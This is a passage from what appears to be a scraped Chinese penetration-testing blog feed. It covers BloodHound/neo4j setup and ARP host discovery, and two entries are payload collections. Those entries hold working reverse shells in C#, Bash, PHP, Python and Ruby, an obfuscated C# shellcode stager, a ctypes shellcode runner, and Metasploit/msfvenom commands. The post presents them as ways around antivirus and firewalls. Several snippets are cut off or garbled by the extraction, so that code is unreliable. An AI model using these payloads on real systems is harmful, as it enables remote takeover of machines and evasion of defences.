Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>16、红蓝对抗渗透测试1</title>
      <link href="/article/16_%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951.html"/>
      <url>/article/16_%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>在团体渗透测试的项目中，如红蓝对抗，团队渗透测试比赛等，最重要的是过程与结果实时共享于团队，例如：A同学nmap目标站，B同学也nmap目标站，这在对抗比赛中是极其浪费时间也是非常容易引起防火墙，日志服务器或其他设备的警觉。所以打算写一系列关于未来团队渗透的对抗。争取做到过程与结果，团队实时共享。把曾经的团队作战经验形成一个适应对抗，比赛等的参考。<br><img src="../do/media/ba3b2df4a82d3ccbabaf29028ef6732e.jpg" alt></p><h3 id="BloodHound简介："><a href="#BloodHound简介：" class="headerlink" title="BloodHound简介："></a>BloodHound简介：</h3><p>BloodHound是2016年出现大家的视线中，它是一个分析和解读AD中权限关系的一个工具。对于攻击者来说，能快速的获取到域中的线索以便进行下一步攻击，而对于防御者来说，可以更快速的得知攻击者可能采取的攻击途径以及域中的可突破的途径。</p><p>项目地址：<br><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound</a></p><p>Debian上安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# apt-get install git wget curl</span><br><span class="line">root@John:~# wget -O - https://debian.neo4j.org/neotechnology.gpg.key|sudo apt-key add</span><br><span class="line">root@John:~# echo &apos;deb http://debian.neo4j.org/repo stable/&apos; | sudo tee /etc/apt/sources.list.d/neo4j.list</span><br><span class="line">root@John:~# apt-get install openjdk-8-jdk openjdk-8-jre </span><br><span class="line">root@John:~# apt-get install neo4j</span><br><span class="line">root@John:~# echo &quot;dbms.active_database=graph.db&quot; &gt;&gt; /etc/neo4j/neo4j.conf </span><br><span class="line">root@John:~# echo &quot;dbms.connector.http.address=0.0.0.0:7474&quot; &gt;&gt; /etc/neo4j/neo4j.conf</span><br><span class="line">root@John:~# echo &quot;dbms.connector.bolt.address=0.0.0.0:7687&quot; &gt;&gt;</span><br><span class="line">/etc/neo4j/neo4j.conf</span><br><span class="line">root@John:~# tail /etc/neo4j/neo4j.conf </span><br><span class="line"># Name of the service</span><br><span class="line">dbms.windows_service_name=neo4j</span><br><span class="line"> #********************************************************************</span><br><span class="line"> # Other Neo4j system properties</span><br><span class="line">#********************************************************************</span><br><span class="line"></span><br><span class="line">dbms.jvm.additional=-Dunsupported.dbms.udc.source=tarball</span><br><span class="line">dbms.active_database=graph.db dbms.connector.http.address=0.0.0.0:7474</span><br><span class="line">dbms.connector.bolt.address=0.0.0.0:7687</span><br><span class="line"></span><br><span class="line">root@John:~j# update-java-alternatives -l java-1.8.0-openjdk-amd64 1081 /usr/lib/jvm/java-1.8.0-openjdk-amd64</span><br><span class="line"></span><br><span class="line">root@John:~j# update-java-alternatives -s java-1.8.0-openjdk-amd64</span><br></pre></td></tr></table></figure><p>下载地址：<a href="https://neo4j.com/download/" target="_blank" rel="noopener">https://neo4j.com/download/</a>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@John:~/Downloads# tar zxvf neo4j-community-3.3.0-unix.tar.gz</span><br><span class="line">root@John:~/Downloads/neo4j-community-3.3.0/bin# ./neo4j start </span><br><span class="line">Active database: graph.db</span><br><span class="line">Directories in use:</span><br><span class="line">home: /root/Downloads/neo4j-community-3.3.0</span><br><span class="line">config: /root/Downloads/neo4j-community-3.3.0/conf</span><br><span class="line">logs: /root/Downloads/neo4j-community-3.3.0/logs</span><br><span class="line">plugins: /root/Downloads/neo4j-community-3.3.0/plugins</span><br><span class="line">import: /root/Downloads/neo4j-community-3.3.0/import</span><br><span class="line">data: /root/Downloads/neo4j-community-3.3.0/data</span><br><span class="line">certificates: /root/Downloads/neo4j-community-3.3.0/certificates</span><br><span class="line">run: /root/Downloads/neo4j-community-3.3.0/run</span><br><span class="line">Starting Neo4j.</span><br><span class="line">WARNING: Max 1024 open files allowed, minimum of 40000 recommended. See the Neo4j manual.</span><br><span class="line">Started neo4j (pid 4286). It is available at http://localhost:7474/ There may be a short delay until the server is ready.</span><br><span class="line">See /root/Downloads/neo4j-community-3.3.0/logs/neo4j.log for current status.</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">root@John:~# apt-get install bloodhound</span><br><span class="line">```  </span><br><span class="line">![](../do/media/86866588d4eca317b3ffcebe92ea3531.jpg)  </span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">root@John:~/Downloads/neo4j-community-3.3.0/bin# nmap 127.0.0.1 -p 7474</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-02 11:16 EST</span><br><span class="line">Nmap scan report for localhost (127.0.0.1) Host is up (0.00011s latency).</span><br><span class="line">PORT STATE SERVICE</span><br><span class="line">7474/tcp open neo4j</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds</span><br></pre></td></tr></table></figure><p><img src="../do/media/061107fe4ab9befe290c2a05bb8f8113.jpg" alt></p><p><img src="../do/media/1e17b267ffcbe85dad02b0d6b3850ffe.jpg" alt></p><p><img src="../do/media/c6c893ce07c3ee585fdcd8cd27083fdc.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>15、基于第十课补充payload2</title>
      <link href="/article/15_%E5%9F%BA%E4%BA%8E%E7%AC%AC%E5%8D%81%E8%AF%BE%E8%A1%A5%E5%85%85payload2.html"/>
      <url>/article/15_%E5%9F%BA%E4%BA%8E%E7%AC%AC%E5%8D%81%E8%AF%BE%E8%A1%A5%E5%85%85payload2.html</url>
      
        <content type="html"><![CDATA[<p>在实战中可能会遇到各种诉求 payload，并且可能遇到各种实际问题，如杀毒软件，防火墙拦截，特定端口通道，隧道等问题。这里我们根据第十课补充其中部分，其他内容后续补充。</p><p>这次主要补充了 C#，Bash</p><p>ps:在线代码高亮：<a href="http://tool.oschina.net/highlight" target="_blank" rel="noopener">http://tool.oschina.net/highlight</a></p><h3 id="1、C-payload"><a href="#1、C-payload" class="headerlink" title="1、C#-payload"></a>1、C#-payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp </span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 192.168.1.107</span><br><span class="line">LHOST =&gt; 192.168.1.107</span><br></pre></td></tr></table></figure><p>混淆：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System; <span class="keyword">using</span> System.Net; <span class="keyword">using</span> System.Net.Sockets; <span class="keyword">using</span> System.Runtime.InteropServices; <span class="keyword">using</span> System.</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">RkfCHtll</span> &#123; <span class="keyword">class</span> <span class="title">LiNGeDokqnEH</span> &#123;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">byte</span>[] <span class="title">idCWVw</span>(<span class="params"><span class="keyword">string</span> VVUUJUQytjlL, <span class="keyword">int</span> eMcukOUqFuHbUv</span>)</span> &#123;</span><br><span class="line">    IPEndPoint nlttgWAMdEQgAo = <span class="keyword">new</span> IPEndPoint(IPAddress.Parse(VVUUJUQytjlL),</span><br><span class="line">eMcukOUqFuHbUv); </span><br><span class="line">    Socket fzTiwdk = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork,</span><br><span class="line">SocketType.Stream, ProtocolType.Tcp); </span><br><span class="line">    <span class="keyword">try</span> &#123; fzTiwdk.Connect(nlttgWAMdEQgAo);&#125;</span><br><span class="line">    <span class="keyword">catch</span> &#123; <span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">    <span class="keyword">byte</span>[] gJVVagJmu = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">    fzTiwdk.Receive(gJVVagJmu, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> GFxHorfhzft = BitConverter.ToInt32(gJVVagJmu, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">byte</span>[] mwxyRsYNn = <span class="keyword">new</span> <span class="keyword">byte</span>[GFxHorfhzft + <span class="number">5</span>]; </span><br><span class="line">    <span class="keyword">int</span> yVcZAEmXaMszAc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (yVcZAEmXaMszAc &lt; GFxHorfhzft)</span><br><span class="line">    &#123; yVcZAEmXaMszAc += fzTiwdk.Receive(mwxyRsYNn,yVcZAEmXaMszAc + <span class="number">5</span>, (GFxHorfhzft - yVcZAEmXaMszAc) &lt; <span class="number">4096</span> </span><br><span class="line">    <span class="keyword">byte</span>[] XEvFDc = BitConverter.GetBytes((<span class="keyword">int</span>)fzTiwdk.Handle);</span><br><span class="line">    Array.Copy(XEvFDc, <span class="number">0</span>, mwxyRsYNn, <span class="number">1</span>, <span class="number">4</span>); mwxyRsYNn[<span class="number">0</span>] = <span class="number">0xBF</span>;</span><br><span class="line">    <span class="keyword">return</span> mwxyRsYNn;&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hcvPkmyIZ</span>(<span class="params"><span class="keyword">byte</span>[] fPnfqu</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (fPnfqu != <span class="literal">null</span>) &#123;</span><br><span class="line">        UInt32 hcoGPUltNcjK = VirtualAlloc(<span class="number">0</span>,(UInt32)fPnfqu.Length, <span class="number">0x1000</span>, <span class="number">0x40</span>);</span><br><span class="line">        Marshal.Copy(fPnfqu, <span class="number">0</span>, (IntPtr)(hcoGPUltNcjK), fPnfqu.Length);</span><br><span class="line">        IntPtr xOxEPnqW = IntPtr.Zero; </span><br><span class="line">        UInt32 ooiiZLMzO = <span class="number">0</span>;</span><br><span class="line">        IntPtr wxPyud = IntPtr.Zero;</span><br><span class="line">        xOxEPnqW = CreateThread(<span class="number">0</span>, <span class="number">0</span>, hcoGPUltNcjK, wxPyud, <span class="number">0</span>, <span class="keyword">ref</span> ooiiZLMzO);</span><br><span class="line">        WaitForSingleObject(xOxEPnqW, <span class="number">0xFFFFFFFF</span>); &#125;&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] dCwAid = <span class="literal">null</span>; dCwAid = idCWVw(<span class="string">"xx.xx.xx.xx"</span>, xx);</span><br><span class="line">    hcvPkmyIZ(dCwAid); &#125;</span><br><span class="line">        [<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">VirtualAlloc</span>(<span class="params">UInt32 qWBbOS,UInt32 HoKzSHMU, UInt [DllImport(<span class="string">"kernel32"</span></span>)]<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span></span></span><br><span class="line"><span class="function">IntPtr <span class="title">CreateThread</span>(<span class="params">UInt32 tqUXybrozZ, UInt32 FMmVpwin, UInt32 H</span></span></span><br><span class="line"><span class="function"><span class="params">[DllImport(<span class="string">"kernel32"</span></span>)] <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32</span></span><br><span class="line"><span class="function"><span class="title">WaitForSingleObject</span>(<span class="params">IntPtr CApwDwK, UInt32 uzGJUddCYTd</span>);</span></span><br></pre></td></tr></table></figure><p><img src="../do/media/926b5570b97743dcfdc212edb6604589.jpg" alt></p><h3 id="2、Bash-payload"><a href="#2、Bash-payload" class="headerlink" title="2、Bash-payload"></a>2、Bash-payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">i &gt;&amp; /dev/tcp/xx.xx.xx.xx/xx 0&gt;&amp;1</span><br><span class="line">```  </span><br><span class="line">![](../do/media/49ee03061e17179d4022d4fc02df4da6.jpg)  </span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">exec 5&lt;&gt;/dev/tcp/xx.xx.xx.xx/xx</span><br><span class="line">cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5;done</span><br><span class="line">```  </span><br><span class="line">![](../do/media/9b61ec08224188e6d2e172a47df7861a.jpg)</span><br><span class="line"></span><br><span class="line">### 附录：</span><br><span class="line">msfvenom 生成 bash</span><br><span class="line">```code</span><br><span class="line">root@John:~# msfvenom -p cmd/unix/reverse_bash LHOST=xx.xx..xx.xx LPORT=xx &gt; -f raw &gt; payload.sh</span><br></pre></td></tr></table></figure><p>参数简化<br>项目地址：<br><a href="https://github.com/g0tmi1k/mpc" target="_blank" rel="noopener">https://github.com/g0tmi1k/mpc</a><br><img src="../do/media/4b4fa44f7174bc8361028253fefead0e.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>14、基于第十课补充payload1</title>
      <link href="/article/14_%E5%9F%BA%E4%BA%8E%E7%AC%AC%E5%8D%81%E8%AF%BE%E8%A1%A5%E5%85%85payload1.html"/>
      <url>/article/14_%E5%9F%BA%E4%BA%8E%E7%AC%AC%E5%8D%81%E8%AF%BE%E8%A1%A5%E5%85%85payload1.html</url>
      
        <content type="html"><![CDATA[<h1 id="基于第十课补充-Payload-1"><a href="#基于第十课补充-Payload-1" class="headerlink" title="基于第十课补充 Payload 1"></a>基于第十课补充 Payload 1</h1><p>在实战中可能会遇到各种诉求 payload，并且可能遇到各种实际问题，如杀毒软件，防火墙拦截，特定端口通道，隧道等问题。这里我们根据第十课补充其中部分，其他内容后续补充。</p><p>这次主要补充了 PHP，python，ruby。</p><p>ps:在线代码高亮：<a href="http://tool.oschina.net/highlight" target="_blank" rel="noopener">http://tool.oschina.net/highlight</a></p><h3 id="1、php-payload"><a href="#1、php-payload" class="headerlink" title="1、php-payload"></a>1、php-payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 192.168.1.107</span><br><span class="line">LHOST =&gt; 192.168.1.107</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">php error_reporting(<span class="number">0</span>); $ip = <span class="string">'x.x.x.x'</span>; $port = <span class="number">53</span>; <span class="keyword">if</span> (($f = <span class="string">'stream_socket_client'</span>) &amp;&amp; is_callable($f)) &#123;</span><br><span class="line">&#123;$port&#125;<span class="string">"); $s_type = 'stream'; &#125; if (!$s &amp;&amp; ($f = 'fsockopen') &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_</span></span><br><span class="line"><span class="string">strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; &#125; &#125; $GLOBALS['msgsock'] = $s;</span></span><br><span class="line"><span class="string">$GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('s</span></span><br><span class="line"><span class="string">&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../do/media/c62949c5cacf6d6a5605200311aa5b9a.jpg" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock=fsockopen(<span class="string">"xx.xx.xx.xx"</span>,xx);exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../do/media/107730c867318d074cc21b9b490d8e8d.jpg" alt></p><h3 id="2、python-payload"><a href="#2、python-payload" class="headerlink" title="2、python-payload"></a>2、python-payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 192.168.1.107</span><br><span class="line">LHOST =&gt; 192.168.1.107</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,struct,time</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s=socket.socket(<span class="number">2</span>,socket.SOCK_STREAM)</span><br><span class="line">        s.connect((<span class="string">'x.x.x.x'</span>,xx))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        time.sleep(<span class="number">5</span>) l=struct.unpack(<span class="string">'&gt;I'</span>,s.recv(<span class="number">4</span>))[<span class="number">0</span>]</span><br><span class="line">d=s.recv(l)</span><br><span class="line"><span class="keyword">while</span> len(d)&lt;l:</span><br><span class="line">    d+=s.recv(l-len(d))</span><br><span class="line">exec(d,&#123;<span class="string">'s'</span>:s&#125;)</span><br><span class="line">```  </span><br><span class="line">![](../do/media/<span class="number">56</span>fa0d76a0ef5b598d14f8a67de449b7.jpg)</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">"xx.xx.xx.xx"</span>,xx));</span><br><span class="line">i<span class="string">"]);</span></span><br><span class="line"><span class="string">```  </span></span><br><span class="line"><span class="string">![](../do/media/268f5cbb31121e9d7f37909587296e7a.jpg)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">```python</span></span><br><span class="line"><span class="string">import socket import subprocess</span></span><br><span class="line"><span class="string">s=socket.socket()</span></span><br><span class="line"><span class="string">s.connect(("</span>xx.xx.xx.xx<span class="string">",xx))</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">  p = subprocess.Popen(s.recv(1024),</span></span><br><span class="line"><span class="string">                      shell=True,</span></span><br><span class="line"><span class="string">                      stdout=subprocess.PIPE,</span></span><br><span class="line"><span class="string">                      stderr=subprocess.PIPE,</span></span><br><span class="line"><span class="string">                      stdin=subprocess.send(p.stdout.read() + p.stderr.read()</span></span><br><span class="line"><span class="string">                      )</span></span><br></pre></td></tr></table></figure><p><img src="../do/media/710a81ff2c29a516aa878760e1fbd110.jpg" alt></p><p>删除特征：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=8.8.8.8 LPORT=88 -f c | tr -d &apos;&quot;&apos; | tr -d &apos;\n&apos;</span><br></pre></td></tr></table></figure><p><img src="../do/media/34aeea621a28e0377b370eda4a63aaa2.jpg" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">reverse_shell = <span class="string">"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72</span></span><br><span class="line"><span class="string">micropoorshell = create_string_buffer(reverse_shell, len(reverse_shell))</span></span><br><span class="line"><span class="string">shellcode = cast(micropoorshell, CFUNCTYPE(c_void_p))</span></span><br><span class="line"><span class="string">shellcode()</span></span><br></pre></td></tr></table></figure><h3 id="2、ruby-payload"><a href="#2、ruby-payload" class="headerlink" title="2、ruby-payload"></a>2、ruby-payload</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'socket'</span>;c=TCPSocket.new(<span class="string">"xx.xx.xx.xx"</span>, x);$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);$stdi</span><br><span class="line">(IO.popen(l,<span class="string">"rb"</span>)&#123;<span class="params">|fd|</span> fd.each_line &#123;<span class="params">|o|</span> c.puts(o.strip) &#125;&#125;) <span class="keyword">rescue</span> <span class="literal">nil</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="../do/media/5253458a976fd4e0212059638751245b.jpg" alt></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'socket'</span>;f=TCPSocket.open(<span class="string">"xx.xx.xx.xx"</span>,xx).to_i;exec sprintf(<span class="string">"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d"</span>,f,f,f)</span><br></pre></td></tr></table></figure><p><img src="../do/media/b9032b829c6a977288c32948088801b6.jpg" alt></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'socket'</span>;c=TCPSocket.new(<span class="string">"xx.xx.xx.xx"</span>,<span class="string">"xx"</span>);<span class="keyword">while</span>(cmd=c.gets);IO.popen(cmd,<span class="string">"r"</span>)&#123;<span class="params">|io|</span>c.print io.read&#125;<span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><img src="../do/media/cdb7a522f8eb1facc72265a923ef173e.jpg" alt></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=TCPSocket.new(<span class="string">"xx.xx.xx.xx"</span>,<span class="string">"xx"</span>);<span class="keyword">while</span>(cmd=c.gets);IO.popen(cmd,<span class="string">"r"</span>)&#123;\<span class="params">|io\|</span>c.print</span><br><span class="line">io.read&#125;<span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><img src="../do/media/9246e2313d4cbcb3c4dacced7c25e0c1.jpg" alt></p><p align="right">--By  Micropoor </p>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>13、基于ARP发现内网存活主机</title>
      <link href="/article/13_%E5%9F%BA%E4%BA%8EARP%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA.html"/>
      <url>/article/13_%E5%9F%BA%E4%BA%8EARP%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA.html</url>
      
        <content type="html"><![CDATA[<h1 id="基于-ARP-发现内网存活主机"><a href="#基于-ARP-发现内网存活主机" class="headerlink" title="基于 ARP 发现内网存活主机"></a>基于 ARP 发现内网存活主机</h1><h3 id="ARP简介："><a href="#ARP简介：" class="headerlink" title="ARP简介："></a>ARP简介：</h3><p>ARP,通过解析网路层地址来找寻数据链路层地址的一个在网络协议包中极其重要的网络传输协议。根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址</p><h3 id="1、nmap扫描"><a href="#1、nmap扫描" class="headerlink" title="1、nmap扫描"></a>1、nmap扫描</h3><pre><code class="code">root@John:~# nmap -sn -PR 192.168.1.1/24</code></pre><p><img src="../do/media/5dfd9a546cd24575a6f3dcc700e27fdb.jpg" alt></p><h3 id="2、msf扫描"><a href="#2、msf扫描" class="headerlink" title="2、msf扫描"></a>2、msf扫描</h3><pre><code class="code">msf &gt; use auxiliary/scanner/discovery/arp_sweepmsf auxiliary(arp_sweep) &gt; show optionsModule options (auxiliary/scanner/discovery/arp_sweep):Name Current Setting Required Description---- --------------- -------- -----------INTERFACE no The name of the interfaceRHOSTS yes The target address range or CIDR identifierSHOST no Source IP AddressSMAC no Source MAC AddressTHREADS 1 yes The number of concurrent threadsTIMEOUT 5 yes The number of seconds to wait for new datamsf auxiliary(arp_sweep) &gt; set RHOSTS 192.168.1.0/24RHOSTS =&gt; 192.168.1.0/24msf auxiliary(arp_sweep) &gt; set THREADS 10</code></pre><p><img src="../do/media/185d0b136875716cb9602245c9c83dc1.jpg" alt><br><img src="../do/media/61293e9ad861848052a95221f7da4b21.jpg" alt>  </p><h3 id="3、netdiscover"><a href="#3、netdiscover" class="headerlink" title="3、netdiscover"></a>3、netdiscover</h3><pre><code class="code">root@John:~# netdiscover -r 192.168.1.0/24 -i wlan0</code></pre><p><img src="../do/media/d521395b5907857c22c4e677dcfc0181.jpg" alt><br><img src="../do/media/e014ab5145b99e17c902cec765d171ce.jpg" alt>  </p><h3 id="4、arp-scan（linux）"><a href="#4、arp-scan（linux）" class="headerlink" title="4、arp-scan（linux）"></a>4、arp-scan（linux）</h3><p>(推荐)速度与快捷<br>项目地址：<br><a href="https://linux.die.net/man/1/arp-scan" target="_blank" rel="noopener">https://linux.die.net/man/1/arp-scan</a><br>arp-scan没有内置kali，需要下载安装。<br><img src="../do/media/1f572b4553deb15c1d8c84a16ba53142.jpg" alt><br><img 